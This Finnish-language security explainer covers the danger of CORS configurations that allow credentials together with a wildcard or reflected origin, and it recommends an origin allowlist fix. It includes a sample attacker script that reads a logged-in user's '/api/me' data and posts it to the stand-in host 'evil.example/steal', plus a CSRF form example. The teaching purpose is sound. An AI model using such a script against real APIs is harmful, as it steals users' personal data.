# API palauttaa Access-Control-Allow-Origin: * ja Access-Control-Allow-Credentials: true. Mikä ongelma?

## Tilanne

API palauttaa:

```http
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```

## Riski — kaksi tasoa

**1. Tarkka yhdistelmä `* + credentials` ei yleensä toimi selaimessa.**

Selain blokkaa credentialed CORS -pyynnön, jos vastaus on täsmälleen `Access-Control-Allow-Origin: *` yhdessä `Access-Control-Allow-Credentials: true` kanssa. Wildcard `*` ei ole sallittu credentialed CORS -pyynnöissä.

**2. Turvallisuusriski on silti todellinen.**

Konfiguraatio kertoo, että API:n CORS-ajattelu on väärä: halutaan sallia credentialit ja samalla kaikki originit. CORS ei ole authorization, vaan selaimen lukurajoituksen höllennys.

Varsinainen vaarallinen tuotantoversio on usein se, että backend peilaa minkä tahansa `Origin`-headerin takaisin:

```http
Origin: https://evil.example

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://evil.example
Access-Control-Allow-Credentials: true
```

Tämä on vaarallisempi kuin staattinen `*`, koska selain hyväksyy sen.

## Mitä CORS oikeasti tekee?

Selain normaalisti estää tätä:

```text
evil.example JavaScript
  → fetch("https://api.example.com/me")
  → selain lähettää pyynnön ehkä kyllä
  → mutta JavaScript ei saa lukea vastausta ilman CORS-lupaa
```

CORS ei ensisijaisesti estä pyynnön lähettämistä. Se estää **vastauksen lukemisen JavaScriptistä** toiselta originilta.

Origin tarkoittaa suunnilleen `scheme + host + port`:

```text
https://app.example.com
https://evil.example
https://api.example.com
```

Nämä ovat eri origineja.

## Case-esimerkki: lasku-API

```text
Frontend: https://app.company.fi
API:      https://api.company.fi
```

Käyttäjä on kirjautunut sisään, ja sessio on cookiessa:

```http
Cookie: session=abc123
```

API palauttaa `GET /api/me`:

```json
{
  "email": "aino@example.com",
  "fullName": "Aino Asiakas",
  "role": "admin",
  "billingAddress": "..."
}
```

Tämän pitäisi olla luettavissa vain omalta frontendiltä (`https://app.company.fi`).

### Oikea CORS-ajatus

API vastaa vain omalle frontendille:

```http
Access-Control-Allow-Origin: https://app.company.fi
Access-Control-Allow-Credentials: true
Vary: Origin
```

Silloin `https://app.company.fi` saa tehdä:

```js
fetch("https://api.company.fi/api/me", {
  credentials: "include"
})
```

ja selain antaa JavaScriptin lukea vastauksen.

### Missä ongelma syntyy?

Jos käyttäjä eksyy haittasivulle `https://evil.example` ja siellä on:

```js
fetch("https://api.company.fi/api/me", {
  credentials: "include"
})
  .then(r => r.text())
  .then(data => fetch("https://evil.example/steal", {
    method: "POST",
    body: data
  }));
```

selain saattaa lähettää pyynnön API:lle, mutta **ei anna evil.examplein JavaScriptin lukea vastausta**, ellei API anna CORS-lupaa juuri tälle originille.

Ongelma syntyy, jos API tekee näin:

```http
Access-Control-Allow-Origin: https://evil.example
Access-Control-Allow-Credentials: true
```

tai backendissä on virheellinen logiikka:

```js
app.use(cors({
  origin: true,
  credentials: true
}));
```

Tuo `origin: true` tarkoittaa monissa kirjastoissa: "peilaa pyynnön Origin takaisin". Jos hyökkääjän sivu lähettää `Origin: https://evil.example`, API vastaa sallivalla CORS-headerilla — ja selain antaa evil.examplein JavaScriptin lukea credentialien kanssa tehdyn vastauksen.

## Hyökkäys askel askeleelta

```text
1. Aino on kirjautunut https://app.company.fi-palveluun.
2. Sama selain sisältää session-cookien api.company.fi:lle.
3. Aino avaa linkin: https://evil.example/arvonta
4. Evil-sivun JavaScript ajaa:
   fetch("https://api.company.fi/api/me", { credentials: "include" })
5. Selain lähettää pyynnön api.company.fi:lle Ainon cookien kanssa.
6. API palauttaa Ainon datan.
7. API:n CORS-konfiguraatio sallii evil.example-originin.
8. Selain antaa evil.examplein JavaScriptin lukea vastauksen.
9. Evil-sivu lähettää datan hyökkääjän palvelimelle.
```

Konkreettinen riski: **käyttäjän selain toimii hyökkääjän työkaluna, ja CORS-virhe antaa haittasivulle luvan lukea kirjautuneen käyttäjän dataa.**

## Miten tämä eroaa CSRF:stä?

**CORS-bugi:** hyökkääjän sivu saa lukea API-vastauksen.

**CSRF:** hyökkääjän sivu saa käyttäjän selaimen tekemään toiminnon, vaikka ei välttämättä saa lukea vastausta.

Ilman CORS-lupaa hyökkääjä voi ehkä lähettää lomakkeen:

```html
<form action="https://api.company.fi/transfer" method="POST">
  <input name="amount" value="1000">
</form>
```

mutta ei saa lukea vastausta. CORS-misconfig taas voi tehdä tästä pahemman, koska hyökkääjä voi myös lukea `/api/me`, `/api/invoices`, `/api/admin/settings` jne.

## Väärä korjaus

"Endpoint on turvassa, koska CORS sallii vain meidän frontendin" — CORS on selaimen käytäntö, ei palvelinpuolen authorization. `curl https://api.company.fi/api/me` ei CORS:ia koske.

"CSRF-token korvaa CORS-headerit" — ne ovat eri mekanismeja. CSRF ei estä vastauksen lukemista.

"Wildcard origin nopeuttaa kehitystä — tuotannossa sama on ok" — credentials + villi origin on vaarallinen signaali.

## Parempi korjaus

Älä tee tätä:

```http
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```

Äläkä tätä:

```js
origin: true,
credentials: true
```

Tee mieluummin:

```js
const allowedOrigins = new Set([
  "https://app.company.fi",
  "https://admin.company.fi"
]);

app.use(cors({
  origin(origin, callback) {
    if (!origin) return callback(null, false);

    if (allowedOrigins.has(origin)) {
      return callback(null, origin);
    }

    return callback(new Error("CORS origin not allowed"));
  },
  credentials: true
}));
```

ja vastauksissa:

```http
Access-Control-Allow-Origin: https://app.company.fi
Access-Control-Allow-Credentials: true
Vary: Origin
```

Lisäksi:

```http
Set-Cookie: session=...; Secure; HttpOnly; SameSite=Lax
```

tai tiukemmassa tapauksessa `SameSite=Strict`.

## Tuotantohuomiot

CORS määrittää, mitkä selainoriginin skriptit saavat lukea API-vastauksen. Jos credentialit sallitaan ja originit sallitaan liian laajasti, haittasivu voi tehdä kirjautuneen käyttäjän selaimesta pyynnön API:in, selain liittää session cookien mukaan, ja väärin konfiguroitu CORS antaa haittasivun JavaScriptille luvan lukea vastauksen.

**Oikea ajatus:** endpoint on turvassa, koska backend tarkistaa tokenin/session ja käyttäjän oikeudet. CORS vain rajoittaa, mitkä selainoriginin skriptit saavat lukea vastauksia.

[Lue lisää](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CORS)
